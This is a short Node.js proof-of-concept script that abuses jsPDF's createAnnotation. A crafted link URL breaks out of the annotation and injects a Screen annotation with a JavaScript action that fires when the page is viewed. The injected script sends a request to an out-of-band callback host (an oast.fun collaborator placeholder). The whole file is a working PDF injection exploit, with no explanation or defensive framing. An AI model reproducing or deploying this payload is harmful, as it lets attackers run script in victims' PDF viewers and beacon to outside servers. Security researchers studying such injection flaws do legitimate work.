const { jsPDF } = require('jspdf');

const doc = new jsPDF();

const tobeEXEC = `
    var xhr = new XMLHttpRequest();
    xhr.open('GET', 'http://{collaborator}.oast.fun', true);
    xhr.onreadystatechange = function () {
        if (xhr.readyState == 4 && xhr.status == 200) {
            console.log(xhr.responseText);
        }
    };
    xhr.send();
`;

doc.createAnnotation({
  bounds: { x: 0, y: 10, w: 200, h: 200 },
  type: 'link',
  url: `#)>>>><</Subtype /Screen /Rect [0 0 900 900] /AA <</PV <</S/JavaScript/JS(${tobeEXEC})>>/(`,
});

doc.text(20, 20, 'tRiborg was HERE');

doc.save('output.pdf');
